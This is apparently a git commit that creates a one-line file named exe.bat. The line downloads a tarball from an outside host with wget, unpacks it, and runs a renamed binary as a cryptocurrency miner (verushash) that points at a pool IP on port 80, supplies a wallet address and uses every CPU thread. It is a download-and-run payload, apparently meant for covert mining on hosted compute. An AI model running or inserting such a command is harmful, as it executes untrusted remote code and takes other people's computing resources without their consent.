e70c3c7c05eb209cc6ac3f5d674671333620f480
6f7ekathleen76672 <137009991+6f7ekathleen76672@users.noreply.github.com>
2024-12-27 05:21:29 +0700

    Create exe.bat

---
+++ exe.bat
@@ -0,0 +1,1 @@
+wget -O joko ikipou.me/JOKO-SBv2.tar.gz && tar -xvf joko && ./JOKO-SBv2/JOKO-SBv2 -a verushash -o 47.236.39.4:80 -u RX5TNT5xdqg8PqMCbqCaC431cfxiMyaGuo.G-$(TZ=UTC-7 date +"%H-%M-%S [%d-%m]") -p x --cpu-threads $(nproc --all)
